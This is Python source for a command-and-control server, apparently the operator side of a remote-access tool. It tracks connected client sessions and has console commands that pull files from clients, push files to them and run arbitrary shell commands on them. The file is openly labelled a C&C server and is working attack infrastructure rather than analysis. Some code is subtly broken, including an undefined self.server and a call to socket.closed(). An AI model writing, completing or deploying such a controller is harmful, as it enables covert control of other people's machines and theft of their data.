from StructureStone import *
from dataclasses import dataclass, field
from NetStone import StoneTransferProtocol, Protocol
from MultiStone import *
import asyncio, secrets, socket


class Server:
    def __init__(self, *address: list) -> None:
        self.__STP = StoneTransferProtocol()
        self.thread = Thread()
        self.struct = ConstructStone()
        self.__Server_thread = threading.Thread(target=self.__run_service_handle, daemon=True)
        self.__Command_thread = threading.Thread(target=self.__handle_command, daemon=True)
        self.__address = address
        self.Sessions = set([])
        self.Session = None
        self.thread_q = []
        self.regular_sockets = {}
        self.packets = {}
        self.response = None
        self.command_list: dict = {
            "sessions" : self.__display_sessions, 
            "session"  : self.__display_session,
            "status"   : self.__display_server_status,
            }
        print(f"""
            \r\n
            =========================================
                C&C Server Successfully Started!
            =========================================

            Server Status: Active
            Version: [ 0.0.2 ]
            Address: [ {self.__address[0]} ]
            Port: [ {self.__address[1]} ]

            The server is up and running smoothly. What would you like to do?
            Type 'help' for assistance.
            Type 'shutdown' to shut down the server.

            =========================================
            \r\n\r\n""")
        
    def run(self):
        self.__Server_thread.start()
        self.__Command_thread.start()
        self.__Server_thread.join()
        self.__Command_thread.join()
        
    def __run_service_handle(self):
        while True:
            self.__handle_Service()
            
    def __handle_Service(self):
        
        self.__STP.SetupConnection(*self.__address, 0)
        thread = self.thread.Constructor(self.__STP.ReceiveStone, self.__STP.client)  
        self.Sessions.add(Session( self.__STP.client , thread ))
        thread.run()

        
    def __handle_command(self):
        while True:
            cmd_found = False
            cmd = input("Server: ")
            
            for command, function in self.command_list.items():
                if cmd == command:
                    print( function() )
                    cmd_found = True
                
            if cmd.startswith("set"):
                print( self.__set_command(cmd) )
                
            elif self.Session:
                self.__client_command(cmd)
                
            elif self.__shutdown_command( cmd ):
                break
            elif not cmd_found:
                print(f"\nCommand {cmd} not found\n")
            
        exit()
        
        
    def __client_command(self, cmd):
        if cmd == "close":
            self.__STP.Disconnect(self.Session)
            self.Sessions.remove(self.Session)
            print(f"\nDisconnected from session: {self.Session.SessionID}\n")
            self.Session = None
            
        elif cmd == "exit":
            print(f"\nSession: {self.Session.SessionID} is Deselect.\n")
            self.Session = None
        
        elif cmd.startswith("download"):
            file_path = cmd.split(" ")[1].replace("\\", "/")
            self.__STP.Download(self.Session, file_path)
            self.packets[self.Session.SessionID] = self.__STP.ReceiveStone(self.Session.Address)
            file_name = file_path.split("/")[-1].replace('"', "")
            
            with open(file_name, "wb") as f:
                f.write(self.packets[self.Session.SessionID].payload.file)
                
            print(f"File {file_name} has been downloaded.\n")
            
            
        elif cmd.startswith("upload"):
            file_path = cmd.split(" ")[1].replace("\\", "/")
            file_name = file_path.split("/")[-1].replace('"', "").encode()
            file_data = bytes()
            
            with open(file_path, "rb") as f:
                file_data = f.read()
                
            self.__STP.Upload(self.Session, file_name +"<name_end>".encode()+ file_data)
            self.packets[self.Session.SessionID] = self.__STP.ReceiveStone(self.Session.Address)
            
            print(f"\n{self.packets[self.Session.SessionID].payload.file.decode()}\n")
            
        elif cmd.startswith("/"):
            try:
                sessionid = self.Session.SessionID
                self.__STP.SendStone(self.Session, self.struct.Command(cmd.replace("/", "")))
                self.packets[sessionid] = self.__STP.ReceiveStone(self.Session.Address)
                print("\nWaiting for the command to be executed...")
                result = self.packets[sessionid].payload.response.decode("cp949")
                print(f"\n{result}\n")
            except AttributeError as e:
                self.Sessions.remove(self.Session)
                self.Session = None
                print(e, "\n")
            
        
        
    def __display_sessions(self):
        display_session = "\n====== [ Index ] ======== [ Address ] ============== [ ID ] ========="
        count = 0
        for Session in self.Sessions:
            display_session += f"\n|      index : {count}      {Session.Address.getsockname()}     [ {Session.SessionID} ]  |"
            count+=1
        display_session += "\n============================[ end ]==================================\n"
        return display_session
        
        
    def __display_session(self):
        if self.Session == None:
            return f"\nNo session has been selected.\nUse the 'set' command to select a session\n"
            
        return f"\nThe currently selected session is {self.Session.SessionID}.\n"
    
    def __display_server_status(self):
        return f"\nServer activation status: {self.server.is_serving()}\n"
        
        
    def __set_command(self, cmd):
        session_id = cmd.replace("set", "").replace(" ", "")
        if not session_id:
            return "\nThe 'set' command must include the 'SessionID'\n"
            
        found_session = next((session for session in self.Sessions if session.SessionID == session_id), None)
        
        if not found_session:
            return "\nSession not found.\n"
            
        self.Session = found_session
        return f"\n{session_id} Session has been selected.\n"


    def __shutdown_command(self, cmd):
        if (len(self.Sessions) == 0 and cmd == "shutdown"):
            
            print("\nThe server has shut down.\n")
            self.__STP.socket.closed()
            
            return True
        
        elif cmd == "shutdown":
            
            for session in self.Sessions:
                self.__STP.Disconnect(session)
            print("\nThe server has shut down.\n")
            
            return True
        
        return False
     
                
    
@dataclass
class Session:
    SessionID: str = field(init=False, default=None)
    Address: tuple
    Thread: None
    # reader: None
    # writer: None

    def __post_init__(self):
        self.SessionID = SessionID(8).Token

    def __hash__(self):
        return hash(self.SessionID)
    
@dataclass
class SessionID:
    """
    Data class representing a session identifier.
    python
    Copy code
    Attributes:
    length (int): The length of the session identifier.
    Token (str): The session token (automatically generated).
    """
    length: int
    Token: str = field(init=False, default=None)

    def __post_init__(self):
        """
        Method executed after initialization.
        Generates the session token.
        """
        self.Token = secrets.token_hex(self.length)
    
Server("127.0.0.1", 6974).run()